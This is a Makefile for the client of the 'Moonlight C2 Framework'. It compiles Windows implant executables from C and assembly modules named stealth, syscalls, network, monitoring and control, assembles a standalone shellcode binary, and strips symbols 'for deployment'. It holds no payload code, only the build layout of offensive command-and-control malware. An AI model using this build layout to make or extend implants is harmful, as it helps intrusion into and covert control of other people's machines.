# Moonlight C2 Framework - Client Makefile with Assembly
# Supports both original and enhanced builds

CC = gcc
ASM = nasm
CFLAGS = -Wall -O2 -DWIN32 -D_WIN32_WINNT=0x0500
ASMFLAGS = -f win32
LDFLAGS = -lws2_32 -ladvapi32 -luser32

# Output directories
BUILD_DIR = build
OBJ_DIR = $(BUILD_DIR)/obj

# Targets
IMPLANT_BASIC = $(BUILD_DIR)/moonlight-implant.exe
IMPLANT_ENHANCED = $(BUILD_DIR)/moonlight-implant-enhanced.exe
SHELLCODE_BIN = $(BUILD_DIR)/shellcode.bin

# Source files for basic implant
BASIC_C_SRC = implant.c
BASIC_C_OBJ = $(OBJ_DIR)/implant.o
BASIC_ASM_OBJ = $(OBJ_DIR)/shellcode.obj

# Source files for enhanced implant
ENHANCED_C_SRC = implant_enhanced.c monitoring_control.c
ENHANCED_C_OBJ = $(OBJ_DIR)/implant_enhanced.o $(OBJ_DIR)/monitoring_control.o
ENHANCED_ASM_OBJS = $(OBJ_DIR)/stealth.obj $(OBJ_DIR)/syscalls.obj $(OBJ_DIR)/network_asm.obj $(OBJ_DIR)/monitoring.obj $(OBJ_DIR)/control.obj

.PHONY: all clean basic enhanced shellcode dirs install strip help

all: dirs basic enhanced shellcode

dirs:
	@if not exist "$(BUILD_DIR)" mkdir "$(BUILD_DIR)"
	@if not exist "$(OBJ_DIR)" mkdir "$(OBJ_DIR)"
	@echo [+] Build directories created

# Basic implant (original version)
basic: dirs $(IMPLANT_BASIC)

$(IMPLANT_BASIC): $(BASIC_C_OBJ) $(BASIC_ASM_OBJ)
	@echo [*] Linking basic implant...
	$(CC) -o $@ $^ $(LDFLAGS)
	@echo [+] Built: $@

# Enhanced implant (with assembly modules)
enhanced: dirs $(IMPLANT_ENHANCED)

$(IMPLANT_ENHANCED): $(ENHANCED_C_OBJ) $(ENHANCED_ASM_OBJS)
	@echo [*] Linking enhanced implant with assembly modules...
	$(CC) -o $@ $^ $(LDFLAGS)
	@echo [+] Built: $@

# Standalone shellcode binary
shellcode: dirs $(SHELLCODE_BIN)

$(SHELLCODE_BIN): shellcode.asm
	@echo [*] Assembling shellcode to binary...
	$(ASM) -f bin shellcode.asm -o $@
	@echo [+] Built: $@

# Compile C source files
$(OBJ_DIR)/implant.o: implant.c
	@echo [*] Compiling $<...
	$(CC) $(CFLAGS) -c $< -o $@

$(OBJ_DIR)/implant_enhanced.o: implant_enhanced.c
	@echo [*] Compiling $<...
	$(CC) $(CFLAGS) -c $< -o $@

$(OBJ_DIR)/monitoring_control.o: monitoring_control.c
	@echo [*] Compiling $<...
	$(CC) $(CFLAGS) -c $< -o $@

# Assemble ASM source files
$(OBJ_DIR)/shellcode.obj: shellcode.asm
	@echo [*] Assembling $<...
	$(ASM) $(ASMFLAGS) $< -o $@

$(OBJ_DIR)/stealth.obj: stealth.asm
	@echo [*] Assembling $<...
	$(ASM) $(ASMFLAGS) $< -o $@

$(OBJ_DIR)/syscalls.obj: syscalls.asm
	@echo [*] Assembling $<...
	$(ASM) $(ASMFLAGS) $< -o $@

$(OBJ_DIR)/network_asm.obj: network_asm.asm
	@echo [*] Assembling $<...
	$(ASM) $(ASMFLAGS) $< -o $@

$(OBJ_DIR)/monitoring.obj: monitoring.asm
	@echo [*] Assembling $<...
	$(ASM) $(ASMFLAGS) $< -o $@

$(OBJ_DIR)/control.obj: control.asm
	@echo [*] Assembling $<...
	$(ASM) $(ASMFLAGS) $< -o $@

# Strip symbols for deployment
strip: $(IMPLANT_ENHANCED)
	@echo [*] Stripping symbols...
	strip -s $(IMPLANT_ENHANCED)
	@echo [+] Stripped: $(IMPLANT_ENHANCED)

# Install to bin directory
install: all
	@echo [*] Installing to ../bin/
	@if not exist "..\bin" mkdir "..\bin"
	copy $(IMPLANT_BASIC) ..\bin\
	copy $(IMPLANT_ENHANCED) ..\bin\
	copy $(SHELLCODE_BIN) ..\bin\
	@echo [+] Installation complete

# Clean build artifacts
clean:
	@echo [*] Cleaning build artifacts...
	@if exist "$(BUILD_DIR)" rmdir /s /q "$(BUILD_DIR)"
	@if exist "*.o" del /Q *.o
	@echo [+] Clean complete

# Help target
help:
	@echo Moonlight C2 Client Build System
	@echo ================================
	@echo.
	@echo Targets:
	@echo   all      - Build everything (basic + enhanced + shellcode)
	@echo   basic    - Build basic implant
	@echo   enhanced - Build enhanced implant with assembly
	@echo   shellcode - Build standalone shellcode binary
	@echo   strip    - Strip symbols from enhanced binary
	@echo   install  - Install binaries to ../bin/
	@echo   clean    - Remove all build artifacts
	@echo   help     - Show this help message
